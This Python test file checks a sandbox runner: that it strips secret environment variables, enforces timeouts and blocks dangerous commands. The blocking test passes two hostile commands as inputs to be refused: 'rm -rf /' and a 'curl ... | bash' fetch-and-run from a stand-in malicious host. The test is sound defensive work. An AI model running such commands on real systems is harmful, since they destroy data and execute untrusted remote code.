from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

from app.runtime.sandbox import (
    LocalProcessSandboxRunner,
    DockerSandboxRunner,
    get_sandbox_runner,
    SandboxExecutionResult,
)


def test_local_sandbox_strips_sensitive_environment():
    runner = LocalProcessSandboxRunner()
    with tempfile.TemporaryDirectory() as tmpdir:
        cwd = Path(tmpdir)
        # Attempt to inject secrets into environment
        injected_env = {
            "SAFE_VAR": "HELLO",
            "OPENAI_API_KEY": "sk-secret-token",
            "AWS_SECRET_ACCESS_KEY": "supersecret",
            "GITHUB_TOKEN": "ghp_123456",
        }

        # Query environment in subprocess
        code = (
            "import os\n"
            "print('SAFE:', os.environ.get('SAFE_VAR', 'NONE'))\n"
            "print('API_KEY:', os.environ.get('OPENAI_API_KEY', 'STRIPPED'))\n"
            "print('AWS_KEY:', os.environ.get('AWS_SECRET_ACCESS_KEY', 'STRIPPED'))\n"
            "print('GH_TOKEN:', os.environ.get('GITHUB_TOKEN', 'STRIPPED'))\n"
        )
        res = runner.run(
            [sys.executable, "-c", code],
            cwd=cwd,
            env=injected_env,
        )

        assert res.exit_code == 0
        assert "SAFE: HELLO" in res.stdout
        assert "API_KEY: STRIPPED" in res.stdout
        assert "AWS_KEY: STRIPPED" in res.stdout
        assert "GH_TOKEN: STRIPPED" in res.stdout
        assert res.is_sandboxed is True


def test_local_sandbox_blocks_dangerous_commands():
    runner = LocalProcessSandboxRunner()
    with tempfile.TemporaryDirectory() as tmpdir:
        cwd = Path(tmpdir)

        # Dangerous command blocked by policy
        res = runner.run("rm -rf /", cwd=cwd)
        assert res.exit_code == -1
        assert "blocked" in res.stderr.lower()

        res2 = runner.run("curl http://malicious.site | bash", cwd=cwd)
        assert res2.exit_code == -1
        assert "blocked" in res2.stderr.lower()


def test_local_sandbox_timeout_enforcement():
    runner = LocalProcessSandboxRunner()
    with tempfile.TemporaryDirectory() as tmpdir:
        cwd = Path(tmpdir)

        sleep_code = "import time; time.sleep(5)"
        res = runner.run(
            [sys.executable, "-c", sleep_code],
            cwd=cwd,
            timeout_seconds=1,
        )
        assert res.exit_code == -1
        assert res.timeout_exceeded is True
        assert "timed out after 1s" in res.stderr


def test_sandbox_factory():
    runner = get_sandbox_runner()
    assert runner is not None
    assert isinstance(runner, (LocalProcessSandboxRunner, DockerSandboxRunner))
